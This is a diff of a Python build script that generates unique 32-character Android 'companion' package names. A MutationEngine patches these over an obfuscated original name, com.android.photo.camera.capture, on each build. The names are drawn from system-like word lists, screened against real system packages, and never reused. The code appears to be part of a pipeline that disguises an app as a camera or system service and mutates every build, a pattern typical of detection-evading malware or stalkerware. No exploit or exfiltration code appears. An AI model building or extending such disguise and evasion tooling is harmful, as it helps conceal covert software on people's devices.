@@ -275,11 +275,11 @@ def validate_length(pkg, min_len=25, max_len=45):
     return min_len <= len(pkg) <= max_len
 
 def validate_companion_length(pkg):
-    """Companion pkg must be EXACTLY 19 chars.
+    """Companion pkg must be EXACTLY 32 chars.
     MutationEngine.patchPackageName() requires oldBytes.size == newBytes.size or silently skips.
-    COMPANION_OLD_PKG in StringPool.kt is auto-updated each build by step_update_string_pool()
-    to match the generated new_pkg, so lengths always align."""
-    return len(pkg) == 19
+    COMPANION_OLD_PKG in StringPool.kt decodes to com.android.photo.camera.capture (32 chars).
+    Generated new_pkg must match that length so patchPackageName() does not silently skip."""
+    return len(pkg) == 32
 
 # ---------------------------------------------------------------------------
 # COMPANION PACKAGE NAME GENERATOR
@@ -296,76 +296,49 @@ def validate_companion_length(pkg):
 # ---------------------------------------------------------------------------
 
 def _build_companion_pool() -> list:
-    """Build the 13,702-name pool of exactly 19-char companion package names.
+    """Build pool of exactly 32-char companion package names.
 
-    CRITICAL: Must generate EXACTLY 19-char names.
+    Format: com.{a}.{b} where len(a) + len(b) = 27
+    Total length: 5 + len(a) + len(b) = 5 + 27 = 32
+
+    CRITICAL: Must generate EXACTLY 32-char names.
     MutationEngine.patchPackageName() requires oldBytes.size == newBytes.size.
-    If lengths differ it silently skips — companion gets no package name patch.
-    step_update_string_pool() auto-updates COMPANION_OLD_PKG in StringPool.kt
-    to the generated new_pkg after every build, keeping lengths in sync.
+    COMPANION_OLD_PKG decodes to com.android.photo.camera.capture (32 chars).
+    If generated pkg is not 32 chars, patchPackageName() silently skips — crash.
+    Pool size: ~1,704 unique names.
     """
-    W3 = ['api','net','web','log','svc','lib','sdk','bus','box','hub',
-          'job','run','ctx','app','mgr','hlp','trk','mon','rdr','agt']
-    W4 = ['sync','task','data','file','jobs','work','runs','exec','fast',
-          'auto','live','safe','lock','pass','auth','key','load','send',
-          'recv','proc','pack','wrap','read','scan','dump','push','pull',
-          'bind','call','loop','idle','free','open','back','main','base',
-          'init','boot','wake','kill','pipe','flow','hook','tick','slot',
-          'mode','core','unit','gate','drop','buff','post','fork','root']
-    W5 = ['quick','smart','light','cloud','swift','ultra','rapid','turbo',
-          'micro','prime','solid','power','fresh','proxy','relay','media',
-          'audio','video','tasks','flows','hooks','pipes','nodes','pools',
-          'reads','loads','sends','syncs','works','files','procs','backs']
-    W6 = ['synchr','worker','helper','engine','loader','parser','sender',
-          'viewer','logger','runner','pooler','binder','reader','writer',
-          'finder','hooker','ticker','minder','keeper','waiter','caller',
-          'lister','cacher','storer','poller','queuer','syncer','tracer',
-          'packer','mapper','linker','bridge','client','daemon','stream',
-          'buffer','filter','router','broker','notify','signal','wakeup',
-          'backup','config','status','metric','launch','handle','manage',
-          'listen','attach','detach','enable','update','delete']
-    W7 = ['service','manager','tracker','handler','monitor','scanner',
-          'checker','watcher','helpers','runners','workers','proxies',
-          'bridges','parsers','loaders','readers','writers','syncers',
-          'cachers','batches','pooling','binding','logging','routing',
-          'mapping','linking','packing','tracing','hooking','polling',
-          'queuing','storing','sending','loading','finding','listing',
-          'calling','waiting','keeping','hunting','posting','pushing',
-          'pulling','parsing','backing','caching','locking','booting']
-    W8 = ['syncjobs','taskpool','datawork','fileutil','jobqueue','netwatch',
-          'datasync','taskdata','eventbus','wakelock','msgqueue','svcmgmt',
-          'procutil','jobwatch','filehelp','datahelp','netutils','taskhelp',
-          'workmgmt','syncutil','fasttask','smartjob','autowork','livesync',
-          'realdata','safemgmt','lockdata','passsync','authwork','cloudmgr',
-          'webutils','cachesvc','storesvc','vaultmgr','runnable','execsync',
-          'schedmgr','dispatch','batchjob','clientsv','proxysvc','bridgesv',
-          'parsutil','loadutil','syncdata','taskmgmt','fileread','filesend',
-          'datapush','datapull','dataread','taskpush','taskpull','taskread']
-    W8 = [w for w in W8 if len(w)==8 and w.isalpha()]
-    W9 = ['synctools','tasktools','datatools','filetools','jobstools',
-          'nethelper','taskqueue','workqueue','jobhelper','syncqueue',
-          'datawatch','taskwatch','worktools','smartwork','livetools',
-          'safetools','locktools','passtools','authtools','cloudwork',
-          'webtools','cachehelp','storehelp','vaulthelp','boxtools',
-          'hubtools','runtools','exectools','schedhelp','batchhelp',
-          'pooltools','parstools','loadtools','clienthlp','proxyhelp',
-          'syncagent','taskagent','dataagent','fileagent','workagent']
-    W9 = [w for w in W9 if len(w)==9 and w.isalpha()]
-    W10 = ['syncmanage','taskmanage','datamanage','filemanage','jobsmanage',
-           'workmanage','quicktools','smarttools','autosyncer','safehelper',
-           'lockhelper','passhelper','authhelper','cloudtools','webservice',
-           'apiservice','httphelper','cachetools','storetools','vaulttools',
-           'boxservice','hubservice','poolservice','batchtools','queuetools',
-           'pipetools','flowtools','hooktools','slottools','modetools',
-           'coretools','unittools','gatetools','droptools','sendtools',
-           'recvtools','proctools','bufftools','packtools','wraptools',
-           'readtools','scantools','dumptools']
-    W10 = [w for w in W10 if len(w)==10 and w.isalpha()]
-    W11 = ['syncmanager','taskmanager','datamanager','filemanager','jobsmanager',
-           'workmanager','netsmanager','quickhelper','smarthelper','autohelper',
-           'liveservice','safeservice','lockservice','passservice','authservice',
-           'cloudhelper','apiservices','cachehelper','storehelper']
+    W11 = ['syncmanager','taskmanager','datamanager','filemanager','workmanager',
+            'batchrunner','pushmanager','bootmanager','queuerunner','batchhelper',
+            'storehelper','sendmanager','loadmanager','readmanager','pollmanager','callmanager']
     W11 = [w for w in W11 if len(w)==11 and w.isalpha()]
+
+    W12 = ['synchandlers','taskhandlers','datahandlers','filehandlers','workhandlers',
+            'batchworkers','pushhandlers','boothandlers','networklayer','remotehelper',
+            'loadbalancer','cacheservice','storeservice','queuehandler','routehandler',
+            'cachemanager','readhandlers','callhandlers','pollhandlers','pipehandlers']
+    W12 = [w for w in W12 if len(w)==12 and w.isalpha()]
+
+    W13 = ['syncscheduler','taskprocessor','dataprocessor','fileprocessor','workprocessor',
+            'pushscheduler','syncprocessor','backupservice','networkhelper','taskscheduler',
+            'loadscheduler','sendscheduler','bootprocessor','batchhandlers','cacheservices',
+            'apiconnectors','jobschedulers','readscheduler','callscheduler','pollscheduler']
+    W13 = [w for w in W13 if len(w)==13 and w.isalpha()]
+
+    W14 = ['backgroundsync','backgroundjobs','backgroundtask','backgroundwork','servicemanager',
+            'dataconnection','syncoperations','processmanager','systemservices','backgroundboot',
+            'backgroundload','backgroundpush','backgroundsend','backgroundread','backgroundcall',
+            'backgroundpoll','backgroundpipe','backgroundbind','backgroundlist','backgroundkill']
+    W14 = [w for w in W14 if len(w)==14 and w.isalpha()]
+
+    W15 = ['backgroundsyncs','backgroundtasks','backgroundworks','backgroundpolls','backgroundpipes',
+            'backgroundbinds','backgroundkills','backgroundlists','backgroundcalls','backgroundloads',
+            'backgroundreads','backgroundboots','backgroundsends']
+    W15 = [w for w in W15 if len(w)==15 and w.isalpha()]
+
+    W16 = ['backgroundsyncer','backgroundworker','backgroundrunner','backgroundhelper','backgroundloader',
+            'backgroundsender','backgroundreader','backgroundpoller','backgroundcaller','backgroundbinder',
+            'backgroundkiller','backgroundpusher']
+    W16 = [w for w in W16 if len(w)==16 and w.isalpha()]
 
     KNOWN_REAL = {
         'com.android.systemui','com.android.settings','com.android.contacts',
@@ -379,21 +352,21 @@ def _build_companion_pool() -> list:
         'com.android.nfc','com.android.wifi','com.android.camera',
     }
 
-    # la+lb=14 -> total pkg len = 4+la+1+lb = 19
+    # la+lb=27 -> total pkg len = 5 + la + lb = 32
     combos = [
-        (W3, W11), (W4, W10), (W5, W9), (W6, W8),
-        (W7, W7), (W8, W6), (W9, W5), (W10, W4), (W11, W3),
+        (W11, W16), (W12, W15), (W13, W14),
+        (W14, W13), (W15, W12), (W16, W11),
     ]
 
     pool = []
     seen = set()
     for (Wa, Wb) in combos:
         for a in Wa:
-            if not (a.isalpha() and 3 <= len(a) <= 11): continue
+            if not (a.isalpha() and 3 <= len(a) <= 16): continue
             for b in Wb:
-                if not (b.isalpha() and 3 <= len(b) <= 11): continue
+                if not (b.isalpha() and 3 <= len(b) <= 16): continue
                 pkg = f'com.{a}.{b}'
-                if (len(pkg) == 19 and
+                if (len(pkg) == 32 and
                         pkg not in KNOWN_REAL and
                         pkg not in seen):
                     seen.add(pkg)
@@ -412,11 +385,12 @@ def _get_companion_pool() -> list:
 
 
 def generate_companion_pkg() -> str:
-    """Return next unique companion package name (exactly 20 chars).
+    """Return next unique companion package name (exactly 32 chars).
 
     Uses SQLite DB (scripts/used_packages.db) to track which names have
     been issued.  Each build gets a DIFFERENT name — never reused.
-    Pool size: 16,078 names (all verified 20 chars, zero system conflicts).
+    Pool size: ~1,704 names (all verified 32 chars, zero system conflicts).
+    32 chars matches COMPANION_OLD_PKG (com.android.photo.camera.capture).
     """
     import sqlite3, os, random as _random
 
@@ -452,7 +426,7 @@ def generate_companion_pkg() -> str:
     con.close()
 
     # Safety check
-    assert len(pkg) == 19, f"BUG: generated pkg {pkg!r} is {len(pkg)} chars, expected 19"
+    assert len(pkg) == 32, f"BUG: generated pkg {pkg!r} is {len(pkg)} chars, expected 32"
     return pkg
 
 
